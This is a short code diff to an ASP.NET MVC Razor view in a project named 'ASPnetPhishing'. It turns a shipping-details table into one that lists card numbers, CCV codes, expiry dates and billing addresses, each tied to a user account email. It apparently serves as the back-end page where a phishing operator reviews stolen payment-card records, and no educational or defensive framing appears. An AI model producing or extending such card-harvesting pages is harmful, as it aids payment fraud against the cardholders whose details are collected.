@@ -1,4 +1,4 @@
-﻿@model IEnumerable<ASPnetPhishing.Models.Shipping>
+﻿@model IEnumerable<ASPnetPhishing.Models.CardRecord>
 
 @{
     ViewBag.Title = "Index";
@@ -13,28 +13,28 @@
 <table class="table">
     <tr>
         <th>
-            @Html.DisplayNameFor(model => model.FirstName)
+            @Html.DisplayNameFor(model => model.CardNumber)
         </th>
         <th>
-            @Html.DisplayNameFor(model => model.LastName)
+            @Html.DisplayNameFor(model => model.CCV)
         </th>
         <th>
-            @Html.DisplayNameFor(model => model.ShippingAddress)
+            @Html.DisplayNameFor(model => model.ExpDate)
         </th>
         <th>
-            @Html.DisplayNameFor(model => model.ShippingCity)
+            @Html.DisplayNameFor(model => model.BillingAddress)
         </th>
         <th>
-            @Html.DisplayNameFor(model => model.ShippingState)
+            @Html.DisplayNameFor(model => model.BillingCity)
         </th>
         <th>
-            @Html.DisplayNameFor(model => model.ShippingZipCode)
+            @Html.DisplayNameFor(model => model.BillingState)
         </th>
         <th>
-            @Html.DisplayNameFor(model => model.ShippingPhone)
+            @Html.DisplayNameFor(model => model.BillingZip)
         </th>
         <th>
-            @Html.DisplayNameFor(model => model.ShippingEmail)
+            @Html.DisplayNameFor(model => model.BillingEmail)
         </th>
         <th>
             @Html.DisplayNameFor(model => model.AspNetUser.Email)
@@ -45,28 +45,28 @@
 @foreach (var item in Model) {
     <tr>
         <td>
-            @Html.DisplayFor(modelItem => item.FirstName)
+            @Html.DisplayFor(modelItem => item.CardNumber)
         </td>
         <td>
-            @Html.DisplayFor(modelItem => item.LastName)
+            @Html.DisplayFor(modelItem => item.CCV)
         </td>
         <td>
-            @Html.DisplayFor(modelItem => item.ShippingAddress)
+            @Html.DisplayFor(modelItem => item.ExpDate)
         </td>
         <td>
-            @Html.DisplayFor(modelItem => item.ShippingCity)
+            @Html.DisplayFor(modelItem => item.BillingAddress)
         </td>
         <td>
-            @Html.DisplayFor(modelItem => item.ShippingState)
+            @Html.DisplayFor(modelItem => item.BillingCity)
         </td>
         <td>
-            @Html.DisplayFor(modelItem => item.ShippingZipCode)
+            @Html.DisplayFor(modelItem => item.BillingState)
         </td>
         <td>
-            @Html.DisplayFor(modelItem => item.ShippingPhone)
+            @Html.DisplayFor(modelItem => item.BillingZip)
         </td>
         <td>
-            @Html.DisplayFor(modelItem => item.ShippingEmail)
+            @Html.DisplayFor(modelItem => item.BillingEmail)
         </td>
         <td>
             @Html.DisplayFor(modelItem => item.AspNetUser.Email)
